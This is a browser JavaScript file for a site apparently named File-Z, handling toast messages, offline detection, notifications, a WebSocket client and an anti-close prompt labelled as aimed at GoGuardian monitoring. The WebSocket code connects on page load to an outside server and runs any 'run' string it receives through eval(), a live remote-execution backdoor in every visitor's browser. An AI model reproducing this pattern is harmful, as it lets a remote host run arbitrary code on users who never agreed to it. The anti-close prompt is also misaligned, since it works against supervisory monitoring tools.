var newestVersion = "2.2.4"; // this is the newest available version of the offline file system


//**********************************************************************************************
//                           Toast config
//**********************************************************************************************
function showToast(message, url, color, timeout) {
  // Check if the container element exists, create it if it doesn't
  var container = document.getElementById('toast-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'toast-container';
    container.style.position = 'fixed';
    container.style.bottom = '20px';
    container.style.right = '20px';
    document.body.appendChild(container);
  }

  // Create the toast element
  var toast = document.createElement('div');
  toast.textContent = message;
  toast.style.backgroundColor = color || '#333';
  toast.style.color = '#fff';
  toast.style.borderRadius = '8px';
  toast.style.padding = '10px 20px';
  toast.style.animation = 'slideIn 0.3s ease-in';
  toast.style.cursor = url ? 'pointer' : 'default';
  toast.style.marginBottom = '10px';
  toast.style.wordBreak = 'break-word';

  // Attach the onclick event to redirect to the specified URL
  if (url) {
    toast.onclick = function() {
      window.location.href = url;
    };
  }

  // Append the toast element to the container
  container.appendChild(toast);

  // Set a timeout to remove the toast
  setTimeout(function() {
    toast.style.animation = 'slideOut 0.3s ease-in';
    setTimeout(function() {
      container.removeChild(toast);
    }, 300);
  }, timeout || 5000);
}

//**********************************************************************************************
//                           End Toast config. 
//                 
//                           Start protocol thingy
//**********************************************************************************************


// used to define and display protocol
var protocol = window.location.protocol;

            if (protocol === 'file:') {
                showToast('Using "file" protocol', '#', 'orange', 3000);
            } else if (protocol === 'https:') {
                showToast('Using "https" protocol. Consider downloading stand alone.', 'https://drive.google.com/drive/folders/1XqZfzWx4XT3Rg8mHimjabHSg_VPg5sm5?usp=share_link', 'orange', 4000);
            } else {
                showToast('Using unknown protocol', '#', 'orange', 3000);
            }


//********************************************************************************************
//                          end protocol thingy
//
//                          start go-gardian anti-close
//********************************************************************************************

// Function to handle beforeunload event
window.onbeforeunload = function(e) {
  var askBeforeUnload = localStorage.getItem("askOnCloseLS");

  if (askBeforeUnload === "true") {
    return 'Someone may be attempting to close your window. Please confirm or deny this action.';
  }
}

//********************************************************************************************
//                          end go-gardian anti-close
//
//                          start offline detection
//********************************************************************************************

var wasOnline = true; // Keep track of the previous online status

// Function to check online status and display toast messages
function checkOnlineStatus() {
  const timestamp = new Date().toLocaleTimeString(); // Get the current time
  if (navigator.onLine && !wasOnline) {
    showToast("You're back online!", '#', 'green', '2000');
    wasOnline = true;
    console.info(`${timestamp} - Network: Online`); // Log online status with timestamp and "Network" level
  } else if (!navigator.onLine && wasOnline) {
    showToast("You're offline!", '#', 'red', '4900');
    wasOnline = false;
    console.info(`${timestamp} - Network: Offline`); // Log offline status with timestamp and "Network" level
  } else if (navigator.onLine && wasOnline) {
    console.info(`${timestamp} - Network: Online`); // Log online status with timestamp and "Network" level
  }
}

// Initial check
checkOnlineStatus();

// Check online status every 5 seconds
setInterval(checkOnlineStatus, 5000);


//********************************************************************************************
//                          end offline detection
//
//                          start websocket
//********************************************************************************************

// Define the server address here
const serverAddress = "wss://fz-websocket.megaderp100.repl.co";
let ws;

function connectWebSocket() {
  ws = new WebSocket(serverAddress);

  ws.addEventListener("open", () => {
    const customClientID = localStorage.getItem("customClientID");
const siteVersion = window.localStorage.getItem("siteVersion");
    const dataToSend = {
      customClientID: customClientID,
      data:{
        version: siteVersion,
      },
    };

    const jsonData = JSON.stringify(dataToSend);
    ws.send(jsonData);
    console.log("WebSocket connected.");
  });

  ws.addEventListener("message", (e) => {
    try {
      const receivedData = JSON.parse(e.data); // Assuming the data is sent as JSON
      console.log("Received data:", receivedData); // Log received data

      if (receivedData.run) {
        const jsCode = receivedData.run;

        if (typeof jsCode === "string") {
          console.log(`Received command: ${jsCode}`);
          // Execute the received JavaScript code using eval()
          eval(jsCode);
        } else {
          console.error("Command must be a string.");
        }
      } else if (receivedData.info) {
        const activeFilezUsers = receivedData.info.connectedClients;
        console.log("people activly using File-Z: " + activeFilezUsers);
        useJsonInfo(receivedData.info);
      } else {
        console.error("Invalid command format.");
      }
    } catch (error) {
      console.error("Error parsing received data:", error);
    }
  });

  ws.addEventListener("close", () => {
    console.warn("WebSocket closed. Reconnecting...");
    setTimeout(connectWebSocket, 2000); // Retry connection after 2 seconds
  });

  ws.addEventListener("error", (error) => {
    console.error("WebSocket error:", error);
    ws.close(); // Close the WebSocket on error
  });
}


function useJsonInfo(jsonInfo) {
    const customClientID = localStorage.getItem("customClientID");
    const siteVersion = window.localStorage.getItem("siteVersion");

    // Find the index of the exact match
    const indexToRemove = jsonInfo.clients.indexOf(customClientID + " [" + siteVersion + "]");

    if (indexToRemove !== -1) {
        // Remove the exact match from the array
        jsonInfo.clients.splice(indexToRemove, 1);
        
        // Now, you can check for duplicates in the modified array
        if (jsonInfo.clients.includes(customClientID + " [" + siteVersion + "]")) {
          showToast("Someone has the same client ID as you!", "#", "red", "5000");  
          //localStorage.setItem("customClientID", "Copy of " + customClientID);
            //window.location.reload();
        }
    }
}



connectWebSocket(); // Initial connection attempt

//********************************************************************************************
//                          end websocket
//
//                          start notifications
//********************************************************************************************


// Ask for permission when the page loads
window.addEventListener('load', function() {
    if (!window.Notification) {
        console.log('Browser does not support notifications.');
    } else {
        Notification.requestPermission().then(function (permission) {
            if (permission === 'granted') {
                console.log('Notification permission granted.');
            } else if (permission === 'denied') {
                console.log('Notification permission denied.');
            } else if (permission === 'default') {
                console.log('Notification permission dismissed (default).');
            }
        }).catch(function (err) {
            console.error(err);
        });
    }
});

function sendNotification(title, body, icon) {
    if (!window.Notification) {
        console.log('Browser does not support notifications.');
    } else {
        // check if permission is already granted
        if (Notification.permission === 'granted') {
            // show notification here
            var notify = new Notification(title, {
                body: body,
                icon: icon,
            });
        } else {
            console.log('Permission to show notifications has not been granted.');
        }
    }
}
